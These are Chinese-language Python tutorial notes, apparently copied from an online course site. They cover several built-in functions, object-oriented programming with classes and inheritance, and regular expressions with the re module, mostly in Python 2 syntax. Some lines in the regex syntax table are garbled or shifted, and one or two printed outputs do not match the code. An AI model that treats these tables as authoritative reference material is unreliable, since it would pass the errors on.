			imag -- int, long, float；
		返回值
			返回一个复数。
		实例
			以下实例展示了 complex 的使用方法：
			>>>complex(1, 2)
			(1 + 2j)
			 
			>>> complex(1)    # 数字
			(1 + 0j)
			 
			>>> complex("1")  # 当做字符串处理
			(1 + 0j)
			 
			# 注意：这个地方在"+"号两边不能有空格，也就是不能写成"1 + 2j"，应该是"1+2j"，否则会报错
			>>> complex("1+2j")
			(1 + 2j)
		
	Python delattr() 函数
		Python 内置函数 Python 内置函数
		描述
			delattr 函数用于删除属性。
			delattr(x, 'foobar') 相等于 del x.foobar。
		语法
			setattr 语法：
			delattr(object, name)
		参数
			object -- 对象。
			name -- 必须是对象的属性。

		返回值
			无。
		实例
			以下实例展示了 delattr 的使用方法：
			#!/usr/bin/python
			# -*- coding: UTF-8 -*-
			 
			class Coordinate:
				x = 10
				y = -5
				z = 0
			 
			point1 = Coordinate() 
			 
			print('x = ',point1.x)
			print('y = ',point1.y)
			print('z = ',point1.z)
			 
			delattr(Coordinate, 'z')
			 
			print('--删除 z 属性后--')
			print('x = ',point1.x)
			print('y = ',point1.y)
			 
			# 触发错误
			print('z = ',point1.z)

			输出结果：

			('x = ', 10)
			('y = ', -5)
			('z = ', 0)
			--删除 z 属性后--
			('x = ', 10)
			('y = ', -5)
			Traceback (most recent call last):
			  File "test.py", line 22, in <module>
				print('z = ',point1.z)
			AttributeError: Coordinate instance has no attribute 'z'

	dict() 函数
		Python 内置函数 Python 内置函数
		描述
			dict() 函数用于创建一个字典。
		语法
			dict 语法：
				class dict(**kwarg)
				class dict(mapping, **kwarg)
				class dict(iterable, **kwarg)
		参数说明：
			**kwargs -- 关键字
			mapping -- 元素的容器。
			iterable -- 可迭代对象。
		返回值
			返回一个字典。
		实例
			以下实例展示了 dict 的使用方法：
			>>>dict()                        # 创建空字典
			{}
			>>> dict(a='a', b='b', t='t')     # 传入关键字
			{'a': 'a', 'b': 'b', 't': 't'}
			>>> dict(zip(['one', 'two', 'three'], [1, 2, 3]))   # 映射函数方式来构造字典
			{'three': 3, 'two': 2, 'one': 1} 
			>>> dict([('one', 1), ('two', 2), ('three', 3)])    # 可迭代对象方式来构造字典
			{'three': 3, 'two': 2, 'one': 1}
			>>>

	dir() 函数
		Python 内置函数 Python 内置函数
		描述
			dir() 函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；带参数时，返回参数的属性、方法列表。如果参数包含方法__dir__()，该方法将被调用。如果参数不包含__dir__()，该方法将最大限度地收集参数信息。
		语法
			dir 语法：
			dir([object])
		参数说明：
			object -- 对象、变量、类型。
		返回值
			返回模块的属性列表。
		实例
			以下实例展示了 dir 的使用方法：
			>>>dir()   #  获得当前模块的属性列表
			['__builtins__', '__doc__', '__name__', '__package__', 'arr', 'myslice']
			>>> dir([ ])    # 查看列表的方法
			['__add__', '__class__', '__contains__', '__delattr__', '__delitem__', '__delslice__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getslice__', '__gt__', '__hash__', '__iadd__', '__imul__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__rmul__', '__setattr__', '__setitem__', '__setslice__', '__sizeof__', '__str__', '__subclasshook__', 'append', 'count', 'extend', 'index', 'insert', 'pop', 'remove', 'reverse', 'sort']
			>>>
			

	divmod()
		python divmod() 函数把除数和余数运算结果结合起来，返回一个包含商和余数的元组(a // b, a % b)。
		在 python 2.3 版本之前不允许处理复数。
		函数语法
			divmod(a, b)
		参数说明：
			a: 数字
			b: 数字

		实例
			>>>divmod(7, 2)
			(3, 1)
			>>> divmod(8, 2)
			(4, 0)
			>>> divmod(1+2j,1+0.5j)
			((1+0j), 1.5j)
 	
	input() 	
		

Python 面向对象
	Python从设计之初就已经是一门面向对象的语言，正因为如此，在Python中创建一个类和对象是很容易的。本章节我们将详细介绍Python的面向对象编程。
	如果你以前没有接触过面向对象的编程语言，那你可能需要先了解一些面向对象语言的一些基本特征，在头脑里头形成一个基本的面向对象的概念，这样有助于你更容易的学习Python的面向对象编程。
	接下来我们先来简单的了解下面向对象的一些基本特征。
	面向对象技术简介

		类(Class): 用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例。
		类变量：类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用。
		数据成员：类变量或者实例变量用于处理类及其实例对象的相关的数据。
		方法重写：如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。
		实例变量：定义在方法中的变量，只作用于当前实例的类。
		继承：即一个派生类（derived class）继承基类（base class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。例如，有这样一个设计：一个Dog类型的对象派生自Animal类，这是模拟"是一个（is-a）"关系（例图，Dog是一个Animal）。
		实例化：创建一个类的实例，类的具体对象。
		方法：类中定义的函数。
		对象：通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法。

	创建类
		使用class语句来创建一个新类，class之后为类的名称并以冒号结尾，如下实例:

		class ClassName:
		   '类的帮助信息'   #类文档字符串
		   class_suite  #类体

		类的帮助信息可以通过ClassName.__doc__查看。
		class_suite 由类成员，方法，数据属性组成。
		实例

		以下是一个简单的Python类实例:
		实例
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		class Employee:
		   '所有员工的基类'
		   empCount = 0
		 
		   def __init__(self, name, salary):
			  self.name = name
			  self.salary = salary
			  Employee.empCount += 1
		   
		   def displayCount(self):
			 print "Total Employee %d" % Employee.empCount
		 
		   def displayEmployee(self):
			  print "Name : ", self.name,  ", Salary: ", self.salary

			empCount 变量是一个类变量，它的值将在这个类的所有实例之间共享。你可以在内部类或外部类使用 Employee.empCount 访问。
			第一种方法__init__()方法是一种特殊的方法，被称为类的构造函数或初始化方法，当创建了这个类的实例时就会调用该方法
			self 代表类的实例，self 在定义类的方法时是必须有的，虽然在调用时不必传入相应的参数。
			self代表类的实例，而非类

	类的方法与普通的函数只有一个特别的区别——它们必须有一个额外的第一个参数名称, 按照惯例它的名称是 self。
		class Test:
			def prt(self):
				print(self)
				print(self.__class__)
		 
		t = Test()
		t.prt()

		以上实例执行结果为：
		<__main__.Test instance at 0x10d066878>
		__main__.Test

		从执行结果可以很明显的看出，self 代表的是类的实例，代表当前对象的地址，而 self.class 则指向类。
		self 不是 python 关键字，我们把他换成 runoob 也是可以正常执行的:
		实例
		class Test:
			def prt(runoob):
				print(runoob)
				print(runoob.__class__)
		 
		t = Test()
		t.prt()

		以上实例执行结果为：

		<__main__.Test instance at 0x10d066878>
		__main__.Test

	创建实例对象
		实例化类其他编程语言中一般用关键字 new，但是在 Python 中并没有这个关键字，类的实例化类似函数调用方式。

		以下使用类的名称 Employee 来实例化，并通过 __init__ 方法接受参数。
			"创建 Employee 类的第一个对象"
			emp1 = Employee("Zara", 2000)
			"创建 Employee 类的第二个对象"
			emp2 = Employee("Manni", 5000)

		访问属性
			您可以使用点(.)来访问对象的属性。使用如下类的名称访问类变量:

			emp1.displayEmployee()
			emp2.displayEmployee()
			print "Total Employee %d" % Employee.empCount

		完整实例：
			实例
			#!/usr/bin/python
			# -*- coding: UTF-8 -*-
			 
			class Employee:
			   '所有员工的基类'
			   empCount = 0
			 
			   def __init__(self, name, salary):
				  self.name = name
				  self.salary = salary
				  Employee.empCount += 1
			   
			   def displayCount(self):
				 print "Total Employee %d" % Employee.empCount
			 
			   def displayEmployee(self):
				  print "Name : ", self.name,  ", Salary: ", self.salary
			 
			"创建 Employee 类的第一个对象"
			emp1 = Employee("Zara", 2000)
			"创建 Employee 类的第二个对象"
			emp2 = Employee("Manni", 5000)
			emp1.displayEmployee()
			emp2.displayEmployee()
			print "Total Employee %d" % Employee.empCount

			执行以上代码输出结果如下：

			Name :  Zara ,Salary:  2000
			Name :  Manni ,Salary:  5000
			Total Employee 2

		你可以添加，删除，修改类的属性，如下所示：
			emp1.age = 7  # 添加一个 'age' 属性
			emp1.age = 8  # 修改 'age' 属性
			del emp1.age  # 删除 'age' 属性

		你也可以使用以下函数的方式来访问属性：
			getattr(obj, name[, default]) : 访问对象的属性。
			hasattr(obj,name) : 检查是否存在一个属性。
			setattr(obj,name,value) : 设置一个属性。如果属性不存在，会创建一个新属性。
			delattr(obj, name) : 删除属性。
			例：
			hasattr(emp1, 'age')    # 如果存在 'age' 属性返回 True。
			getattr(emp1, 'age')    # 返回 'age' 属性的值
			setattr(emp1, 'age', 8) # 添加属性 'age' 值为 8
			delattr(empl, 'age')    # 删除属性 'age'
		
	Python内置类属性
		__dict__ : 类的属性（包含一个字典，由类的数据属性组成）
		__doc__ :类的文档字符串
		__name__: 类名
		__module__: 类定义所在的模块（类的全名是'__main__.className'，如果类位于一个导入模块mymod中，那么className.__module__ 等于 mymod）
		__bases__ : 类的所有父类构成元素（包含了一个由所有父类组成的元组）

		Python内置类属性调用实例如下：
			实例
			#!/usr/bin/python
			# -*- coding: UTF-8 -*-
			 
			class Employee:
			   '所有员工的基类'
			   empCount = 0
			 
			   def __init__(self, name, salary):
				  self.name = name
				  self.salary = salary
				  Employee.empCount += 1
			   
			   def displayCount(self):
				 print "Total Employee %d" % Employee.empCount
			 
			   def displayEmployee(self):
				  print "Name : ", self.name,  ", Salary: ", self.salary
			 
			print "Employee.__doc__:", Employee.__doc__
			print "Employee.__name__:", Employee.__name__
			print "Employee.__module__:", Employee.__module__
			print "Employee.__bases__:", Employee.__bases__
			print "Employee.__dict__:", Employee.__dict__

			执行以上代码输出结果如下：
			Employee.__doc__: 所有员工的基类
			Employee.__name__: Employee
			Employee.__module__: __main__
			Employee.__bases__: ()
			Employee.__dict__: {'__module__': '__main__', 'displayCount': <function displayCount at 0x10a939c80>, 'empCount': 0, 'displayEmployee': <function displayEmployee at 0x10a93caa0>, '__doc__': '\xe6\x89\x80\xe6\x9c\x89\xe5\x91\x98\xe5\xb7\xa5\xe7\x9a\x84\xe5\x9f\xba\xe7\xb1\xbb', '__init__': <function __init__ at 0x10a939578>}

	python对象销毁(垃圾回收)
		Python 使用了引用计数这一简单技术来跟踪和回收垃圾。
		在 Python 内部记录着所有使用中的对象各有多少引用。
		一个内部跟踪变量，称为一个引用计数器。
		当对象被创建时， 就创建了一个引用计数， 当这个对象不再需要时， 也就是说， 这个对象的引用计数变为0 时， 它被垃圾回收。但是回收不是"立即"的， 由解释器在适当的时机，将垃圾对象占用的内存空间回收。

		a = 40      # 创建对象  <40>
		b = a       # 增加引用， <40> 的计数
		c = [b]     # 增加引用.  <40> 的计数

		del a       # 减少引用 <40> 的计数
		b = 100     # 减少引用 <40> 的计数
		c[0] = -1   # 减少引用 <40> 的计数

		垃圾回收机制不仅针对引用计数为0的对象，同样也可以处理循环引用的情况。循环引用指的是，两个对象相互引用，但是没有其他变量引用他们。这种情况下，仅使用引用计数是不够的。Python 的垃圾收集器实际上是一个引用计数器和一个循环垃圾收集器。作为引用计数的补充， 垃圾收集器也会留心被分配的总量很大（及未通过引用计数销毁的那些）的对象。 在这种情况下， 解释器会暂停下来， 试图清理所有未引用的循环。
		实例
			析构函数 __del__ ，__del__在对象销毁的时候被调用，当对象不再被使用时，__del__方法运行：
		实例
			#!/usr/bin/python
			# -*- coding: UTF-8 -*-
			 
			class Point:
			   def __init__( self, x=0, y=0):
				  self.x = x
				  self.y = y
			   def __del__(self):
				  class_name = self.__class__.__name__
				  print class_name, "销毁"
			 
			pt1 = Point()
			pt2 = pt1
			pt3 = pt1
			print id(pt1), id(pt2), id(pt3) # 打印对象的id
			del pt1
			del pt2
			del pt3

			以上实例运行结果如下：

			3083401324 3083401324 3083401324
			Point 销毁

			注意：通常你需要在单独的文件中定义一个类，
		
	类的继承
		面向对象的编程带来的主要好处之一是代码的重用，实现这种重用的方法之一是通过继承机制。继承完全可以理解成类之间的类型和子类型关系。
		需要注意的地方：继承语法 class 派生类名（基类名）：//... 基类名写在括号里，基本类是在类定义的时候，在元组之中指明的。
		在python中继承中的一些特点：
			1：在继承中基类的构造（__init__()方法）不会被自动调用，它需要在其派生类的构造中亲自专门调用。
			2：在调用基类的方法时，需要加上基类的类名前缀，且需要带上self参数变量。区别于在类中调用普通函数时并不需要带上self参数
			3：Python总是首先查找对应类型的方法，如果它不能在派生类中找到对应的方法，它才开始到基类中逐个查找。（先在本类中查找调用的方法，找不到才去基类中找）。
		如果在继承元组中列了一个以上的类，那么它就被称作"多重继承" 。

		语法：
			派生类的声明，与他们的父类类似，继承的基类列表跟在类名之后，如下所示：
			class SubClassName (ParentClass1[, ParentClass2, ...]):
			   'Optional class documentation string'
			   class_suite

		实例
			#!/usr/bin/python
			# -*- coding: UTF-8 -*-
			 
			class Parent:        # 定义父类
			   parentAttr = 100
			   def __init__(self):
				  print "调用父类构造函数"
			 
			   def parentMethod(self):
				  print '调用父类方法'
			 
			   def setAttr(self, attr):
				  Parent.parentAttr = attr
			 
			   def getAttr(self):
				  print "父类属性 :", Parent.parentAttr
			 
			class Child(Parent): # 定义子类
			   def __init__(self):
				  print "调用子类构造方法"
			 
			   def childMethod(self):
				  print '调用子类方法'
			 
			c = Child()          # 实例化子类
			c.childMethod()      # 调用子类的方法
			c.parentMethod()     # 调用父类方法
			c.setAttr(200)       # 再次调用父类的方法 - 设置属性值
			c.getAttr()          # 再次调用父类的方法 - 获取属性值

			以上代码执行结果如下：
				调用子类构造方法
				调用子类方法
				调用父类方法
				父类属性 : 200

		你可以继承多个类
			class A:        # 定义类 A
			.....

			class B:         # 定义类 B
			.....

			class C(A, B):   # 继承类 A 和 B
			.....

		你可以使用issubclass()或者isinstance()方法来检测。

			issubclass() - 布尔函数判断一个类是另一个类的子类或者子孙类，语法：issubclass(sub,sup)
			isinstance(obj, Class) 布尔函数如果obj是Class类的实例对象或者是一个Class子类的实例对象则返回true。

	方法重写
		如果你的父类方法的功能不能满足你的需求，你可以在子类重写你父类的方法：
		实例：
			#!/usr/bin/python
			# -*- coding: UTF-8 -*-
			 
			class Parent:        # 定义父类
			   def myMethod(self):
				  print '调用父类方法'
			 
			class Child(Parent): # 定义子类
			   def myMethod(self):
				  print '调用子类方法'
			 
			c = Child()          # 子类实例
			c.myMethod()         # 子类调用重写方法

			执行以上代码输出结果如下：

			调用子类方法

		基础重载方法
			下表列出了一些通用的功能，你可以在自己的类重写：
			序号	方法						描述 					简单的调用
			1	__init__ ( self [,args...] )	构造函数				obj = className(args)
			2	__del__( self )				析构方法, 删除一个对象		del obj
			3	__repr__( self )			转化为供解释器读取的形式	repr(obj)
			4	__str__( self )			用于将值转化为适于人阅读的形式	str(obj)
			5	__cmp__ ( self, x )			对象比较					cmp(obj, x)
	
	
	运算符重载
		Python同样支持运算符重载，实例如下：
		实例
		#!/usr/bin/python
		 
		class Vector:
		   def __init__(self, a, b):
			  self.a = a
			  self.b = b
		 
		   def __str__(self):
			  return 'Vector (%d, %d)' % (self.a, self.b)
		   
		   def __add__(self,other):
			  return Vector(self.a + other.a, self.b + other.b)
		 
		v1 = Vector(2,10)
		v2 = Vector(5,-2)
		print v1 + v2

		以上代码执行结果如下所示:

		Vector(7,8)

	类属性与方法
		类的私有属性
			__private_attrs：两个下划线开头，声明该属性为私有，不能在类的外部被使用或直接访问。在类内部的方法中使用时 self.__private_attrs。
		
		类的方法
			在类的内部，使用 def 关键字可以为类定义一个方法，与一般函数定义不同，类方法必须包含参数 self,且为第一个参数
		
		类的私有方法
			__private_method：两个下划线开头，声明该方法为私有方法，不能在类地外部调用。在类的内部调用 self.__private_methods
		
		实例
			#!/usr/bin/python
			# -*- coding: UTF-8 -*-
			 
			class JustCounter:
				__secretCount = 0  # 私有变量
				publicCount = 0    # 公开变量
			 
				def count(self):
					self.__secretCount += 1
					self.publicCount += 1
					print self.__secretCount
			 
			counter = JustCounter()
			counter.count()
			counter.count()
			print counter.publicCount
			print counter.__secretCount  # 报错，实例不能访问私有变量

			Python 通过改变名称来包含类名:
				1
				2
				2
			Traceback (most recent call last):
			  File "test.py", line 17, in <module>
				print counter.__secretCount  # 报错，实例不能访问私有变量
			AttributeError: JustCounter instance has no attribute '__secretCount'

			Python不允许实例化的类访问私有数据，但你可以使用 object._className__attrName 访问属性，将如下代码替换以上代码的最后一行代码：
				.........................
				print counter._JustCounter__secretCount

			执行以上代码，执行结果如下：
				1
				2
				2
				2

			单下划线、双下划线、头尾双下划线说明：
				__foo__: 定义的是特列方法，类似 __init__() 之类的。
				_foo: 以单下划线开头的表示的是 protected 类型的变量，即保护类型只能允许其本身与子类进行访问，不能用于 from module import *
				__foo: 双下划线的表示的是私有类型(private)的变量, 只能是允许这个类本身进行访问了。

	笔记列表
		object._className__attrName 实例及解析

		#!/usr/bin/python
		# -*- coding: UTF-8 -*-

		class JustCounter:
			__secretCount = 0  # 私有变量
			publicCount = 0    # 公开变量
			def count(self):
				self.__secretCount += 1
				self.publicCount += 1
				print self.__secretCount
			def count2(self):
				print self.__secretCount

		counter = JustCounter()
		counter.count()
		# 在类的对象生成后,调用含有类私有属性的函数时就可以使用到私有属性.
		counter.count()
		#第二次同样可以.
		print counter.publicCount
		print counter._JustCounter__secretCount  # 不改写报错，实例不能访问私有变量
		try:
			counter.count2()
		except IOError:
			print "不能调用非公有属性!"
		else:
			print "ok!" #现在呢!证明是滴!


		

Python正则表达式
	正则表达式是一个特殊的字符序列，它能帮助你方便的检查一个字符串是否与某种模式匹配。
	Python 自1.5版本起增加了re 模块，它提供 Perl 风格的正则表达式模式。
	re 模块使 Python 语言拥有全部的正则表达式功能。
	compile 函数根据一个模式字符串和可选的标志参数生成一个正则表达式对象。该对象拥有一系列方法用于正则表达式匹配和替换。
	re 模块也提供了与这些方法功能完全一致的函数，这些函数使用一个模式字符串做为它们的第一个参数。

	本章节主要介绍Python中常用的正则表达式处理函数。
	re.match函数
	re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。

	函数语法：

	re.match(pattern, string, flags=0)

	函数参数说明：
	参数	描述
	pattern	匹配的正则表达式
	string	要匹配的字符串。
	flags	标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。

	匹配成功re.match方法返回一个匹配的对象，否则返回None。

	我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。
	匹配对象方法	描述
	group(num=0)	匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。
	groups()	返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。
	实例 1
	#!/usr/bin/python
	# -*- coding: UTF-8 -*- 
	 
	import re
	print(re.match('www', 'www.runoob.com').span())  # 在起始位置匹配
	print(re.match('com', 'www.runoob.com'))         # 不在起始位置匹配

	以上实例运行输出结果为：

	(0, 3)
	None

	实例 2
	#!/usr/bin/python
	import re
	 
	line = "Cats are smarter than dogs"
	 
	matchObj = re.match( r'(.*) are (.*?) .*', line, re.M|re.I)
	 
	if matchObj:
	   print "matchObj.group() : ", matchObj.group()
	   print "matchObj.group(1) : ", matchObj.group(1)
	   print "matchObj.group(2) : ", matchObj.group(2)
	else:
	   print "No match!!"

	以上实例执行结果如下：

	matchObj.group() :  Cats are smarter than dogs
	matchObj.group(1) :  Cats
	matchObj.group(2) :  smarter

	re.search方法

	re.search 扫描整个字符串并返回第一个成功的匹配。

	函数语法：

	re.search(pattern, string, flags=0)

	函数参数说明：
	参数	描述
	pattern	匹配的正则表达式
	string	要匹配的字符串。
	flags	标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。

	匹配成功re.search方法返回一个匹配的对象，否则返回None。

	我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。
	匹配对象方法	描述
	group(num=0)	匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。
	groups()	返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。
	实例 1
	#!/usr/bin/python
	# -*- coding: UTF-8 -*- 
	 
	import re
	print(re.search('www', 'www.runoob.com').span())  # 在起始位置匹配
	print(re.search('com', 'www.runoob.com').span())         # 不在起始位置匹配

	以上实例运行输出结果为：

	(0, 3)
	(11, 14)

	实例 2
	#!/usr/bin/python
	import re
	 
	line = "Cats are smarter than dogs";
	 
	searchObj = re.search( r'(.*) are (.*?) .*', line, re.M|re.I)
	 
	if searchObj:
	   print "searchObj.group() : ", searchObj.group()
	   print "searchObj.group(1) : ", searchObj.group(1)
	   print "searchObj.group(2) : ", searchObj.group(2)
	else:
	   print "Nothing found!!"
	以上实例执行结果如下：

	searchObj.group() :  Cats are smarter than dogs
	searchObj.group(1) :  Cats
	searchObj.group(2) :  smarter

	re.match与re.search的区别

	re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。
	实例
	#!/usr/bin/python
	import re
	 
	line = "Cats are smarter than dogs";
	 
	matchObj = re.match( r'dogs', line, re.M|re.I)
	if matchObj:
	   print "match --> matchObj.group() : ", matchObj.group()
	else:
	   print "No match!!"
	 
	matchObj = re.search( r'dogs', line, re.M|re.I)
	if matchObj:
	   print "search --> matchObj.group() : ", matchObj.group()
	else:
	   print "No match!!"
	以上实例运行结果如下：

	No match!!
	search --> matchObj.group() :  dogs

	检索和替换

	Python 的 re 模块提供了re.sub用于替换字符串中的匹配项。

	语法：

	re.sub(pattern, repl, string, count=0, flags=0)

	参数：

		pattern : 正则中的模式字符串。
		repl : 替换的字符串，也可为一个函数。
		string : 要被查找替换的原始字符串。
		count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。

	实例
	#!/usr/bin/python
	# -*- coding: UTF-8 -*-
	 
	import re
	 
	phone = "2004-959-559 # 这是一个国外电话号码"
	 
	# 删除字符串中的 Python注释 
	num = re.sub(r'#.*$', "", phone)
	print "电话号码是: ", num
	 
	# 删除非数字(-)的字符串 
	num = re.sub(r'\D', "", phone)
	print "电话号码是 : ", num
	以上实例执行结果如下：

	电话号码是:  2004-959-559 
	电话号码是 :  2004959559

	repl 参数是一个函数

	以下实例中将字符串中的匹配的数字乘于 2：
	实例
	#!/usr/bin/python
	# -*- coding: UTF-8 -*-
	 
	import re
	 
	# 将匹配的数字乘于 2
	def double(matched):
		value = int(matched.group('value'))
		return str(value * 2)
	 
	s = 'A23G4HFD567'
	print(re.sub('(?P<value>\d+)', double, s))

	执行输出结果为：

	A46G8HFD1134

	正则表达式修饰符 - 可选标志

	正则表达式可以包含一些可选标志修饰符来控制匹配的模式。修饰符被指定为一个可选的标志。多个标志可以通过按位 OR(|) 它们来指定。如 re.I | re.M 被设置成 I 和 M 标志：
	修饰符	描述
	re.I	使匹配对大小写不敏感
	re.L	做本地化识别（locale-aware）匹配
	re.M	多行匹配，影响 ^ 和 $
	re.S	使 . 匹配包括换行在内的所有字符
	re.U	根据Unicode字符集解析字符。这个标志影响 \w, \W, \b, \B.
	re.X	该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。
	正则表达式模式

	模式字符串使用特殊的语法来表示一个正则表达式：

	字母和数字表示他们自身。一个正则表达式模式中的字母和数字匹配同样的字符串。

	多数字母和数字前加一个反斜杠时会拥有不同的含义。

	标点符号只有被转义时才匹配自身，否则它们表示特殊的含义。

	反斜杠本身需要使用反斜杠转义。

	由于正则表达式通常都包含反斜杠，所以你最好使用原始字符串来表示它们。模式元素(如 r'\t'，等价于 '\\t')匹配相应的特殊字符。

	下表列出了正则表达式模式语法中的特殊元素。如果你使用模式的同时提供了可选的标志参数，某些模式元素的含义会改变。
	模式	描述
	^	匹配字符串的开头
	$	匹配字符串的末尾。
	.	匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。
	[...]	用来表示一组字符,单独列出：[amk] 匹配 'a'，'m'或'k'
	[^...]	不在[]中的字符：[^abc] 匹配除了a,b,c之外的字符。
	re*	匹配0个或多个的表达式。
	re+	匹配1个或多个的表达式。
	re?	匹配0个或1个由前面的正则表达式定义的片段，非贪婪方式
	re{ n}	
	re{ n,}	精确匹配n个前面表达式。
	re{ n, m}	匹配 n 到 m 次由前面的正则表达式定义的片段，贪婪方式
	a| b	匹配a或b
	(re)	G匹配括号内的表达式，也表示一个组
	(?imx)	正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。
	(?-imx)	正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。
	(?: re)	类似 (...), 但是不表示一个组
	(?imx: re)	在括号中使用i, m, 或 x 可选标志
	(?-imx: re)	在括号中不使用i, m, 或 x 可选标志
	(?#...)	注释.
	(?= re)	前向肯定界定符。如果所含正则表达式，以 ... 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边。
	(?! re)	前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功
	(?> re)	匹配的独立模式，省去回溯。
	\w	匹配字母数字及下划线
	\W	匹配非字母数字及下划线
	\s	匹配任意空白字符，等价于 [\t\n\r\f].
	\S	匹配任意非空字符
	\d	匹配任意数字，等价于 [0-9].
	\D	匹配任意非数字
	\A	匹配字符串开始
	\Z	匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。c
	\z	匹配字符串结束
	\G	匹配最后匹配完成的位置。
	\b	匹配一个单词边界，也就是指单词和空格间的位置。例如， 'er\b' 可以匹配"never" 中的 'er'，但不能匹配 "verb" 中的 'er'。
	\B	匹配非单词边界。'er\B' 能匹配 "verb" 中的 'er'，但不能匹配 "never" 中的 'er'。
	\n, \t, 等.	匹配一个换行符。匹配一个制表符。等
	\1...\9	匹配第n个分组的内容。
	\10	匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。
	正则表达式实例
	字符匹配
	实例	描述
	python	匹配 "python".
	字符类
	实例	描述
	[Pp]ython 	匹配 "Python" 或 "python"
	rub[ye]	匹配 "ruby" 或 "rube"
	[aeiou]	匹配中括号内的任意一个字母
	[0-9]	匹配任何数字。类似于 [0123456789]
	[a-z]	匹配任何小写字母
	[A-Z]	匹配任何大写字母
	[a-zA-Z0-9]	匹配任何字母及数字
	[^aeiou]	除了aeiou字母以外的所有字符
	[^0-9]	匹配除了数字外的字符
	特殊字符类
	实例	描述
	.	匹配除 "\n" 之外的任何单个字符。要匹配包括 '\n' 在内的任何字符，请使用象 '[.\n]' 的模式。
	\d	匹配一个数字字符。等价于 [0-9]。
	\D 	匹配一个非数字字符。等价于 [^0-9]。
	\s	匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。
	\S 	匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。
	\w	匹配包括下划线的任何单词字符。等价于'[A-Za-z0-9_]'。
	\W	匹配任何非单词字符。等价于 '[^A-Za-z0-9_]'。
	Python 面向对象
	Python CGI编程
	笔记列表

		   jim

		  264***7522@qq.com
		正则表达式实例：

		#!/usr/bin/python
		import re
		line = "Cats are smarter than dogs"
		matchObj = re.match( r'(.*) are (.*?) .*', line, re.M|re.I)
		if matchObj:
			print "matchObj.group() : ", matchObj.group()
			print "matchObj.group(1) : ", matchObj.group(1)
			print "matchObj.group(2) : ", matchObj.group(2)
		else:
			print "No match!!"

		正则表达式：

		r'(.*) are (.*?) .*'

		解析:

		首先，这是一个字符串，前面的一个 r 表示字符串为非转义的原始字符串，让编译器忽略反斜杠，也就是忽略转义字符。但是这个字符串里没有反斜杠，所以这个 r 可有可无。
			(.*) 第一个匹配分组，.* 代表匹配除换行符之外的所有字符。
			(.*?) 第二个匹配分组，.*? 后面多个问号，代表非贪婪模式，也就是说只匹配符合条件的最少字符
			后面的一个 .* 没有括号包围，所以不是分组，匹配效果和第一个一样，但是不计入匹配结果中。

		matchObj.group() 等同于 matchObj.group(0)，表示匹配到的完整文本字符

		matchObj.group(1) 得到第一组匹配结果，也就是(.*)匹配到的

		matchObj.group(2) 得到第二组匹配结果，也就是(.*?)匹配到的

		因为只有匹配结果中只有两组，所以如果填 3 时会报错。


正则表达式 - 教程
	简介
		正则表达式(Regular Expression)是一种文本模式，包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为"元字符"）。
		正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。
		正则表达式是烦琐的，但它是强大的，学会之后的应用会让你除了提高效率外，会给你带来绝对的成就感。只要认真阅读本教程，加上应用的时候进行一定的参考，掌握正则表达式不是问题。
		许多程序设计语言都支持利用正则表达式进行字符串操作。

		现在开始学习正则表达式！
		以下实例从字符串 str 中找出数字：
		从字符串 str 中提取数字部分的内容(匹配一次)：
		var str = "abc123def";
		var patt1 = /[0-9]+/;
		document.write(str.match(patt1));

		以下标记的文本是获得的匹配的表达式：
		123 
		

		除非您以前使用过正则表达式，否则您可能不熟悉一此术语。但是，毫无疑问，您已经使用过不涉及脚本的某些正则表达式概念。
		例如，您很可能使用 ? 和 * 通配符来查找硬盘上的文件。? 通配符匹配文件名中的单个字符，而 * 通配符匹配零个或多个字符。像 data?.dat 这样的模式将查找下列文件：
			data1.dat
			data2.dat
			datax.dat
			dataN.dat

		使用 * 字符代替 ? 字符扩大了找到的文件的数量。data*.dat 匹配下列所有文件：
			data.dat
			data1.dat
			data2.dat
			data12.dat
			datax.dat
			dataXYZ.dat

		尽管这种搜索方法很有用，但它还是有限的。通过理解 * 通配符的工作原理，引入了正则表达式所依赖的概念，但正则表达式功能更强大，而且更加灵活。
		正则表达式的使用，可以通过简单的办法来实现强大的功能。下面先给出一个简单的示例：
			^ 为匹配输入字符串的开始位置。
			[0-9]+匹配多个数字， [0-9] 匹配单个数字，+ 匹配一个或者多个。
